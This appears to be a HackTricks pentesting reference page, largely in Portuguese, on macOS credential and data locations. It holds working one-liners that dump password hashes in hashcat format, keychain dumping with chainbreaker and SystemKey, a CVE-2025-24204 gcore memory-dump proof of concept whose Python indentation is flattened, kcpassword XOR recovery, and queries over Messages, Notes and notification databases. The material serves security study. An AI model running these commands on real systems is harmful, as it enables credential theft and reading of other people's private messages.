# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Senhas

### Shadow Passwords

A shadow password é armazenada com a configuração do usuário em plists localizados em **`/var/db/dslocal/nodes/Default/users/`**.\
O seguinte oneliner pode ser usado para extrair **todas as informações sobre os usuários** (incluindo informações de hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**este**](https://github.com/octomagon/davegrohl.git) podem ser usados para transformar o hash para o **formato** do **hashcat**.

Uma alternativa em uma linha que fará o dump das credenciais de todas as contas que não são de serviço no formato do hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Outra maneira de obter o `ShadowHashData` de um usuário é usando `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Este arquivo é **usado apenas** quando o sistema é iniciado em **single-user mode** (portanto, não com muita frequência).

### Keychain Dump

Observe que, ao usar o binary `security` para **dump the passwords decrypted**, vários prompts pedirão ao usuário para permitir essa operação.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
No macOS moderno, os backings stores mais interessantes normalmente são **`~/Library/Keychains/login.keychain-db`** e **`/Library/Keychains/System.keychain`**. Eles são arquivos baseados em SQLite, mas o acesso em plaintext ainda é intermediado por **`securityd`**: roubar o DB bruto geralmente só fornece metadados e blobs criptografados, a menos que você também recupere a senha do usuário, `SystemKey`, ou uma master key em memória.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Com base neste comentário [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) parece que essas ferramentas não estão funcionando mais no Big Sur.

### Visão geral do Keychaindump

Uma ferramenta chamada **keychaindump** foi desenvolvida para extrair passwords dos keychains do macOS, mas enfrenta limitações em versões mais novas do macOS, como o Big Sur, כפי indicado em uma [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). O uso do **keychaindump** exige que o atacante obtenha acesso e escale privilégios para **root**. A ferramenta explora o fato de que o keychain é desbloqueado por padrão no login do usuário por conveniência, permitindo que aplicações acessem-no sem exigir repetidamente a senha do usuário. No entanto, se um usuário optar por bloquear seu keychain após cada uso, **keychaindump** se torna ineficaz.

O **Keychaindump** opera visando um processo específico chamado **securityd**, descrito pela Apple como um daemon para operações de autorização e criptográficas, crucial para acessar o keychain. O processo de extração envolve identificar uma **Master Key** derivada da senha de login do usuário. Essa key é essencial para ler o arquivo do keychain. Para localizar a **Master Key**, o **keychaindump** varre o heap de memória do **securityd** usando o comando `vmmap`, procurando possíveis keys dentro de áreas marcadas como `MALLOC_TINY`. O seguinte comando é usado para inspecionar esses locais de memória:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Após identificar possíveis master keys, **keychaindump** pesquisa nos heaps por um padrão específico (`0x0000000000000018`) que indica um candidato à master key. Etapas adicionais, incluindo deobfuscation, são necessárias para utilizar essa key, conforme descrito no source code do **keychaindump**. Analysts focados nessa área devem observar que os dados cruciais para decrypting o keychain ficam armazenados na memory do processo **securityd**. Um exemplo de comando para executar **keychaindump** é:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) pode ser usado para extrair os seguintes tipos de informação de um keychain do OSX de maneira forensicamente correta:

- Senha do Keychain com hash, adequada para cracking com [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Tendo a senha de desbloqueio do keychain, uma master key obtida usando [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou um arquivo de desbloqueio como SystemKey, o Chainbreaker também fornecerá senhas em texto claro.

Sem um desses métodos para desbloquear o Keychain, o Chainbreaker exibirá todas as outras informações disponíveis.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Faça dump das chaves do keychain (com passwords) com memory dump**

[Siga estes passos](../index.html#dumping-memory-with-osxpmem) para realizar um **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Se você souber a senha do usuário, você pode usá-la para **dump e decrypt dos keychains que pertencem ao usuário**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Chave mestra do Keychain via entitlement `gcore` (CVE-2025-24204)

O macOS 15.0 (Sequoia) trouxe `/usr/bin/gcore` com o entitlement **`com.apple.system-task-ports.read`**, então qualquer admin local (ou app assinado malicioso) podia despejar **a memória de qualquer processo mesmo com SIP/TCC aplicados**. Fazer dump de `securityd` vaza a **chave mestra do Keychain** em claro e permite descriptografar `login.keychain-db` sem a senha do usuário.

**Reprodução rápida em builds vulneráveis (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Alimente a chave hex extraída no Chainbreaker (`--key <hex>`) para descriptografar o login keychain. A Apple removeu a entitlement no **macOS 15.3+**, então isso só funciona em builds do Sequoia sem patch ou em sistemas que mantiveram o binário vulnerável.

### kcpassword

O arquivo **kcpassword** é um arquivo que contém a **senha de login do usuário**, mas apenas se o proprietário do sistema tiver **habilitado o login automático**. Portanto, o usuário fará login automaticamente sem ser solicitado por uma senha (o que não é muito seguro).

A senha é armazenada no arquivo **`/etc/kcpassword`** xor com a chave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se a senha do usuário for maior que a chave, a chave será reutilizada.\
Isso torna a senha bem fácil de recuperar, por exemplo usando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informações interessantes em Bancos de Dados

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Antes do **Sequoia**, você normalmente pode encontrar o store do Notification Center em **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. No **Sequoia+** a Apple o moveu para o group container protegido por TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

A maior parte das informações interessantes é armazenada dentro de colunas **blob**, então você precisará extrair esse conteúdo e transformá-lo em algo legível para humanos (`plutil -p -`, `strings`, ou um pequeno parser). Exemplos rápidos de triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Recent privacy issues (NotificationCenter DB)

- No macOS **14.7–15.1**, a Apple armazenava o conteúdo dos banners no SQLite `db2/db` sem redaction adequada. As CVEs **CVE-2024-44292/44293/40838/54504** permitiam que qualquer usuário local lesse o texto das notificações de outros usuários apenas abrindo o DB (sem prompt de TCC).
- A Apple mitigou isso movendo o DB para `group.com.apple.usernoted` e protegendo-o com TCC em builds mais recentes do Sequoia, então em sistemas atuais você normalmente precisa do contexto correto do usuário ou de um TCC bypass para lê-lo.
- Em endpoints legados, copie os arquivos `db`, `db-wal` e `db-shm` juntos antes de atualizar ou reiniciar se quiser preservar os artefatos.

### Notes

As **notes** dos usuários podem ser encontradas em `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Se a one-liner acima for muito barulhenta, exporte `ZICNOTEDATA.ZDATA`, faça gunzip e analise o protobuf: isso geralmente é mais confiável do que executar `strings` diretamente no SQLite.

### Background Tasks / Login Items

Desde o **Ventura**, login items aprovados pelo usuário e várias background tasks são rastreados em stores **BTM** como **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** e o cache de sistema versionado **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Esses arquivos são úteis para identificar rapidamente persistence, helper tools e alguns background items gerenciados por MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Para a perspectiva de persistência e os internals do BTM, confira [a página de locais de auto-start](../../macos-auto-start-locations.md#login-items) e [as notas do Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferences

Em apps de macOS, as preferences ficam em **`$HOME/Library/Preferences`** e, no iOS, em `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

No macOS, a ferramenta cli **`defaults`** pode ser usada para **modificar o arquivo Preferences**.

**`/usr/sbin/cfprefsd`** reivindica os serviços XPC `com.apple.cfprefsd.daemon` e `com.apple.cfprefsd.agent` e pode ser chamado para executar ações como modificar preferences.

## OpenDirectory permissions.plist

O arquivo `/System/Library/OpenDirectory/permissions.plist` contém permissões aplicadas em atributos de node e é protegido por SIP.\
Este arquivo concede permissões a usuários específicos por UUID (e não uid), para que possam acessar informações sensíveis específicas como `ShadowHashData`, `HeimdalSRPKey` e `KerberosKeys`, entre outras:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notificações do Sistema

### Notificações Darwin

O daemon principal para notificações é **`/usr/sbin/notifyd`**. Para receber notificações, os clientes devem se registrar através da porta Mach `com.apple.system.notification_center` (verifique-os com `sudo lsmp -p <pid notifyd>`). O daemon é configurável com o arquivo `/etc/notify.conf`.

Os nomes usados para notificações são notações únicas de DNS reverso e, quando uma notificação é enviada para um deles, o(s) cliente(s) que indicaram que podem tratá-la a receberão.

É possível fazer dump do estado atual (e ver todos os nomes) enviando o sinal SIGUSR2 para o processo notifyd e lendo o arquivo gerado: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

O **Distributed Notification Center**, cujo binário principal é **`/usr/sbin/distnoted`**, é outra forma de enviar notificações. Ele expõe alguns serviços XPC e realiza algumas verificações para tentar validar os clientes.

### Apple Push Notifications (APN)

Neste caso, os aplicativos podem se registrar para **topics**. O cliente gerará um token contatando os servidores da Apple através de **`apsd`**.\
Em seguida, os providers também terão gerado um token e poderão se conectar aos servidores da Apple para enviar mensagens aos clientes. Essas mensagens serão recebidas localmente por **`apsd`**, que encaminhará a notificação para o aplicativo que a estiver aguardando.

As preferências estão localizadas em `/Library/Preferences/com.apple.apsd.plist`.

Há um banco de dados local de mensagens localizado no macOS em `/Library/Application\ Support/ApplePushService/aps.db` e no iOS em `/var/mobile/Library/ApplePushService`. Ele possui 3 tabelas: `incoming_messages`, `outgoing_messages` e `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Também é possível obter informações sobre o daemon e as conexões usando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notificações do usuário

Estas são notificações que o usuário deve ver na tela:

- **`CFUserNotification`**: Estas API fornecem uma forma de mostrar na tela um pop-up com uma mensagem.
- **The Bulletin Board**: Isto mostra no iOS um banner que desaparece e será armazenado no Notification Center.
- **`NSUserNotificationCenter`**: Isto é o Bulletin Board do iOS no MacOS. Em versões mais antigas do macOS, o banco de dados normalmente fica em `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; no Sequoia+ ele foi movido para `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Referências

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
